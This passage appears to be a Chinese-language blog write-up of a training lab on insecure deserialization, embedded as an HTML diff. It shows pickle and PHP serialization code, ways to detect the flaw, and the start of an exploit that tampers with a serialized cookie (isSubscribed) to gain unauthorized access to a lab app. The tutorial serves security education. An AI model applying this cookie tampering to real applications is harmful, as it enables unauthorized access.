+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Notes successfully unpickled.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;pickle&amp;#39;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;note_content&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;notes_obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;pickled_content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pickle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;notes_obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;serialized_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pickled_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;binary_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;02x&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pickled_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Notes pickled successfully.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Pickling Process&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;创建 Notes 类&lt;/strong&gt; ：该类用于管理笔记列表。它提供了添加笔记和检索所有笔记的方法，方便管理应用程序的状态。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;序列化（Pickling）&lt;/strong&gt; ：当用户提交注释时，Notes 类实例（包括所有注释）将使用 &lt;code&gt;pickle.dumps()&lt;/code&gt; 进行序列化。此函数将 Python 对象转换为二进制格式，以便 Python 稍后可以将其转换回对象。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;显示序列化数据（Base64 编码）&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;为什么使用 base64 编码&lt;/strong&gt; ：序列化数据是二进制的，并非在所有环境下都适合安全显示。二进制数据可能包含一些字节，这些字节可能会干扰通信协议（例如 HTTP ）。Base64 是一种将二进制数据转换为纯文本的编码方案。它只使用可读字符，因此即使在不支持二进制数据的通道上传输，也能保证安全。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;编码过程&lt;/strong&gt; ：序列化 &lt;code&gt;Notes&lt;/code&gt; 对象后，使用 &lt;code&gt;base64.b64encode()&lt;/code&gt; 将二进制数据编码为 base64 字符串。此字符串可以安全地显示在 HTML 中，并且易于存储或传输。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424134002274.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424134002274&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;反序列化（Unpickling）&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Base64 解码&lt;/strong&gt; ：解封时，首先使用 &lt;code&gt;base64.b64decode()&lt;/code&gt; 将 base64 字符串解码回二进制格式。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;反序列化&lt;/strong&gt; ：然后将二进制数据传递给 &lt;code&gt;pickle.loads()&lt;/code&gt; ，后者从二进制流中重建原始 Python 对象。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用字符串&amp;quot;&lt;strong&gt;TEST123&lt;/strong&gt;&amp;ldquo;进行序列化后可以得到：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Pickling&lt;/strong&gt; ：当此字符串被 pickle 时，它​​会被转换成人类无法读取的二进制格式。此二进制格式包含有关数据类型、数据本身以及重建对象所需的其他元数据的信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Base64 编码&lt;/strong&gt; ：数据的二进制形式随后被编码为 Base64 字符串，可能看起来像 &lt;code&gt;gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在探索序列化格式时，我们讨论了如何在 PHP 和 Python 中实现这一关键功能。PHP 使用 &lt;code&gt;serialize()&lt;/code&gt; 和 &lt;code&gt;unserialize()&lt;/code&gt; 函数将对象和其他数据类型转换为易于存储且易于重建的格式。同样，Python 使用 &lt;code&gt;Pickle&lt;/code&gt; 模块将对象序列化为字节流，并将其反序列化回原始状态。&lt;/p&gt;
+&lt;p&gt;除了这两种语言之外，序列化是各种编程环境的共同特性，每种环境都有独特的实现和库。在 &lt;strong&gt;Java&lt;/strong&gt; 中，对象序列化通过 &lt;code&gt;Serializable&lt;/code&gt; 接口实现，允许将对象转换为字节流，反之亦然，这对于网络通信和数据持久性至关重要。对于 &lt;strong&gt;.NET&lt;/strong&gt;，序列化多年来已经有了显著的发展。最初， &lt;code&gt;BinaryFormatter&lt;/code&gt; 通常用于二进制序列化；但是， 由于安全问题， 现在不鼓励使用它 。现代 .NET 应用程序通常使用 &lt;code&gt;System.Text.Json&lt;/code&gt; 进行 JSON 序列化，或使用 &lt;strong&gt;System.Xml.Serialization&lt;/strong&gt; 进行 XML 任务，这反映了向更安全、更标准化的数据交换格式的转变。&lt;strong&gt;Ruby&lt;/strong&gt; 通过其 &lt;code&gt;Marshal&lt;/code&gt; 模块提供了简便性，该模块以序列化和反序列化对象而闻名，对于更易于人类阅读的格式，它通常使用 &lt;strong&gt;YAML&lt;/strong&gt; 。每种语言的序列化方法都反映了其使用上下文和安全注意事项，强调了理解和正确实现序列化以确保跨 Web 应用程序的数据完整性和安全性的重要性。&lt;/p&gt;
+&lt;h2 id=&#34;鉴别&#34;&gt;鉴别
+&lt;/h2&gt;&lt;p&gt;在彻底了解不同编程语言的序列化之后，我们将转向网络安全的一个关键方面，即利用和缓解与序列化相关的漏洞。在讨论漏洞利用技术的具体细节之前，务必了解如何识别应用程序中的这些漏洞，无论您是否能够访问代码（白盒测试）或是不能（黑盒测试）。&lt;/p&gt;
+&lt;h3 id=&#34;访问源代码&#34;&gt;访问源代码
+&lt;/h3&gt;&lt;p&gt;当可以访问源代码时，识别序列化漏洞会更加简单，但需要对要查找的内容有敏锐的理解。例如，通过代码审查，我们可以检查源代码中是否存在 &lt;code&gt;serialize()&lt;/code&gt; 、 &lt;code&gt;unserialize()&lt;/code&gt; 、 &lt;code&gt;pickle.loads(&lt;/code&gt; ) 等序列化函数 。我们必须特别注意任何可能将用户提供的输入直接传递给这些函数的位置。&lt;/p&gt;
+&lt;h3 id=&#34;无法访问源代码&#34;&gt;无法访问源代码
+&lt;/h3&gt;&lt;p&gt;在无法访问源代码的情况下审计应用程序时，挑战在于仅根据外部观察和交互推断其如何处理数据。这通常被称为&lt;strong&gt;黑盒测试&lt;/strong&gt; 。在这里，我们专注于检测服务器响应和 cookie 中的模式，这些模式可能表明使用了序列化和潜在的漏洞。作为一名渗透测试人员，在 PHP 文件名末尾附加波浪号 &lt;code&gt;~&lt;/code&gt; 是攻击者用来尝试访问由文本编辑器或版本控制系统创建的备份或临时文件的常用技术。当编辑或保存文件时，某些文本编辑器或版本控制系统可能会在文件名后附加波浪号，制作原始文件的备份副本。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;分析服务器响应&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;错误消息&lt;/strong&gt; ：某些错误消息可以间接表明序列化存在问题。例如，PHP 可能会抛出包含 &lt;code&gt;**unserialize()**&lt;/code&gt; 或 &lt;strong&gt;Object deserialisation error&lt;/strong&gt; 等短语的错误或警告，这些短语会暴露底层序列化过程和潜在的漏洞。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;应用程序行为不一致&lt;/strong&gt; ：响应被操纵的输入（例如，修改的 Cookie 或 POST 数据）时出现的异常行为可能表明数据反序列化和处理方式存在问题。观察应用程序如何处理被修改的序列化数据可以提供潜在漏洞代码的线索。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;检查 Cookie&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Cookie 中的 Base64 编码值（ PHP 和 .NET）&lt;/strong&gt; ：如果 Cookie 包含看似 Base64 编码的数据，对其进行解码可能会发现序列化的对象或数据结构。PHP 通常使用序列化进行会话管理，并以序列化格式存储会话变量。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ASP.NET 视图状态&lt;/strong&gt; ：.NET 应用程序可能会在发送到客户端浏览器的视图状态中使用序列化。有时可以看到一个名为 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 的字段，该字段采用 base64 编码。对其进行解码和检查可以揭示它是否包含可被利用的序列化数据。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞利用-更新属性&#34;&gt;漏洞利用-更新属性
+&lt;/h2&gt;&lt;h3 id=&#34;更新对象的属性&#34;&gt;更新对象的属性
+&lt;/h3&gt;&lt;p&gt;在本任务中，我们将探索一个 PHP  实例，并以一个简单的笔记共享应用程序作为案例研究。我们的笔记共享应用程序允许用户轻松创建、保存和共享笔记。用户可以将笔记输入到应用程序中，然后将其保存以供将来参考。此外，用户还可以与他人共享笔记，从而促进协作和信息交换。该应用程序还包含基于订阅的功能，确保只有订阅用户才能访问某些功能，例如笔记共享。您可以通过链接 &lt;code&gt;http://10.10.183.12/case1&lt;/code&gt; 访问该网站。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424140013116.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424140013116&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;让我们了解一下该应用程序是如何构建的。&lt;/p&gt;
+&lt;h4 id=&#34;定义-notes-类&#34;&gt;定义 Notes 类
+&lt;/h4&gt;&lt;p&gt;该应用程序有一个 &lt;code&gt;Notes&lt;/code&gt; 类，代表我们应用程序中的一条注释。该类有三个私有属性： &lt;code&gt;user&lt;/code&gt; 、 &lt;code&gt;role&lt;/code&gt; 和 &lt;code&gt;isSubscribed&lt;/code&gt; 。我们还有 setter 和 getter 方法来操作 &lt;code&gt;isSubscribed&lt;/code&gt; 属性。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Notes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;role&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isSubscribed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;setIsSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$isSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isSubscribed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getIsSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isSubscribed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;将用户数据存储在-cookie-中&#34;&gt;将用户数据存储在 Cookie 中
+&lt;/h4&gt;&lt;p&gt;当用户首次访问我们的应用时，它会设置一个序列化的 Cookie，其中包含用户数据。这些数据包括用户名、角色和订阅状态（ &lt;code&gt;isSubscribed&lt;/code&gt; ）。如果用户是付费会员（ &lt;strong&gt;isSubscribed = true&lt;/strong&gt; ），则允许他们分享笔记。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424135959233.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424135959233&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;利用漏洞&#34;&gt;利用漏洞
+&lt;/h4&gt;&lt;p&gt;在此步骤中，我们将说明攻击者如何通过修改序列化的 cookie 值来利用此漏洞，以获得对共享笔记的未经授权的访问。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;序列化 cookie&lt;/strong&gt; ：解码 base64 编码的 cookie 值后，我们获得 Notes 对象的以下序列化表示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Notes&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;guest&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;guest&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;isSubscribed&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
